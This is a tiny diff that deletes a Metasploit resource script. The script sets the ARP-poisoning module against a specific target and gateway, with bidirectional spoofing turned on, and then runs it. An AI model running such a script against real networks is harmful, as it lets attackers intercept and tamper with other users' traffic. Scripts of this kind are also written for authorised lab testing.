@@ -1,8 +1,0 @@
-
-use auxiliary/spoof/arp/arp_poisoning
-set DHOSTS 192.100.200.172
-set SHOSTS 192.100.200.1
-set LOCALSIP 192.100.200.177
-set BIDIRECTIONAL true
-exploit
-exit
